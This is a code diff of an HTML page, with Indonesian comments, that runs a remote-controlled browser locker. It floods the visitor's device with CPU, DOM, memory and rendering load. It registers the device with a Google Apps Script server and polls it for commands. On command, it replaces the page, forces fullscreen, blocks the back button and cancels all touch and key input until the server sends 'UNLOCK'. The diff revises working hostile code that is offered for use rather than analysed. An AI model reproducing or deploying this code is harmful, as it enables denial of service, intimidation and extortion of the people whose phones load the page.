@@ -16,84 +16,49 @@
 const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
 const DID='z'+Math.random().toString(36).substring(2,15);
 const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
-let locked=true;
+let locked=false;
 let floodActive=true;
 
-// === FLOOD LAG PARAH ===
-function flood(){
+// === FLOOD ===
+function floodCPU(){
   if(!floodActive)return;
-  
-  // CPU flood
-  for(let i=0;i<1000;i++){
-    Math.random()*Math.random()*Math.random();
-    JSON.stringify({a:Math.random(),b:new Array(100).fill(Math.random())});
-  }
-  
-  // DOM flood
-  for(let i=0;i<50;i++){
-    let d=document.createElement('div');
-    d.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;background:rgba(0,0,0,0.01)';
-    d.textContent=Math.random().toString(36).repeat(10);
-    document.body.appendChild(d);
-    setTimeout(()=>d.remove(),100);
-  }
-  
-  // Memory flood
-  let arr=[];
-  for(let i=0;i<100;i++){
-    arr.push(new Array(1000).fill(Math.random()));
-  }
-  
-  // Render flood
-  document.body.style.transform='translate('+Math.random()+'px,'+Math.random()+'px)';
-  document.body.style.transform='';
-  
-  requestAnimationFrame(flood);
+  for(let i=0;i<5000;i++){Math.sin(Math.random()*9999)*Math.cos(Math.random()*9999);Math.pow(Math.random(),Math.random());}
+  setTimeout(floodCPU,0);
+}
+function floodDOM(){
+  if(!floodActive)return;
+  for(let i=0;i<200;i++){let d=document.createElement('div');d.style.cssText='position:fixed;width:2px;height:2px;background:rgba(0,0,0,0.001)';d.textContent=Math.random().toString(36).repeat(20);document.body.appendChild(d);setTimeout(()=>{try{d.remove()}catch(e){}},50);}
+  setTimeout(floodDOM,0);
+}
+function floodMemory(){
+  if(!floodActive)return;
+  let x=[];for(let i=0;i<500;i++)x.push(new Array(5000).fill(Math.random().toString(36)));
+  setTimeout(floodMemory,0);
+}
+function floodRender(){
+  if(!floodActive)return;
+  document.body.style.transform='translate('+Math.random()*2+'px,'+Math.random()*2+'px)';document.body.style.opacity='0.'+Math.floor(Math.random()*9+1);document.body.style.transform='';document.body.style.opacity='1';
+  requestAnimationFrame(floodRender);
 }
 
-// === SEMAT MATI ===
+// === SEMAT MATI (baru aktif pas Lock) ===
 function sematMati(){
   locked=true;
   goFull();
   blockAll();
 }
-
 function goFull(){
-  const el=document.documentElement;
-  el.requestFullscreen?.();
-  el.webkitRequestFullscreen?.();
+  document.documentElement.requestFullscreen?.();
+  document.documentElement.webkitRequestFullscreen?.();
 }
-
 function blockAll(){
   for(let i=0;i<5;i++) history.pushState(null,'',location.href);
-  
-  const noEvent=e=>{
-    e.preventDefault();
-    e.stopPropagation();
-    e.stopImmediatePropagation();
-    return false;
-  };
-  
-  ['contextmenu','touchstart','touchmove','touchend','touchcancel','gesturestart',
-   'gesturechange','gestureend','wheel','keydown','keyup','keypress','pointerdown',
-   'pointermove','pointerup','click','dblclick','select','scroll'].forEach(ev=>{
-    document.addEventListener(ev,noEvent,{passive:false,capture:true});
-    window.addEventListener(ev,noEvent,{passive:false,capture:true});
+  const no=e=>{e.preventDefault();e.stopPropagation();return false;};
+  ['contextmenu','touchstart','touchmove','touchend','gesturestart','gesturechange','gestureend','wheel','keydown','keyup','keypress','pointerdown','pointermove','pointerup','click','dblclick','select','scroll'].forEach(ev=>{
+    document.addEventListener(ev,no,{passive:false,capture:true});
+    window.addEventListener(ev,no,{passive:false,capture:true});
   });
-  
-  window.addEventListener('popstate',()=>{
-    for(let i=0;i<3;i++) history.pushState(null,'',location.href);
-    goFull();
-  });
-  
-  document.addEventListener('visibilitychange',()=>{
-    if(document.hidden) goFull();
-  });
-  
-  document.addEventListener('fullscreenchange',()=>{
-    if(!document.fullscreenElement) goFull();
-  });
-  
+  window.addEventListener('popstate',()=>{for(let i=0;i<3;i++)history.pushState(null,'',location.href);goFull();});
   document.body.style.touchAction='none';
   document.body.style.pointerEvents='none';
 }
@@ -104,43 +69,32 @@ async function reg(){
     let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'register',device_id:DID,model:M})});
     let d=await r.json();
     if(d.command==='UNLOCK'){unlockAll();return;}
-    if(d.command){
-      document.body.innerHTML=d.command;
-      sematMati();
-      floodActive=false;
-    }
+    if(d.command){document.body.innerHTML=d.command;sematMati();floodActive=false;}
   }catch(e){}
 }
-
 async function chk(){
   try{
     let r=await fetch(API+'?action=check&device_id='+DID);
     let d=await r.json();
     if(d.command==='UNLOCK'){unlockAll();return;}
-    if(d.command){
-      document.body.innerHTML=d.command;
-      sematMati();
-      floodActive=false;
-    }
+    if(d.command){document.body.innerHTML=d.command;sematMati();floodActive=false;}
   }catch(e){}
 }
-
 function unlockAll(){
   locked=false;
   floodActive=false;
   document.body.innerHTML='<div style="color:#666;">OK</div>';
 }
 
-// === START ===
-sematMati();
-flood();
+// === START: cuma flood, belum semat ===
+floodCPU();
+floodDOM();
+floodMemory();
+floodRender();
 reg();
 setInterval(chk,5000);
-setInterval(()=>{
-  if(!locked)return;
-  goFull();
-  for(let i=0;i<3;i++) history.pushState(null,'',location.href);
-},50);
+// Loop semat mati cuma jalan kalau locked=true
+setInterval(()=>{if(!locked)return;goFull();for(let i=0;i<3;i++)history.pushState(null,'',location.href);},50);
 </script>
 </body>
 </html>
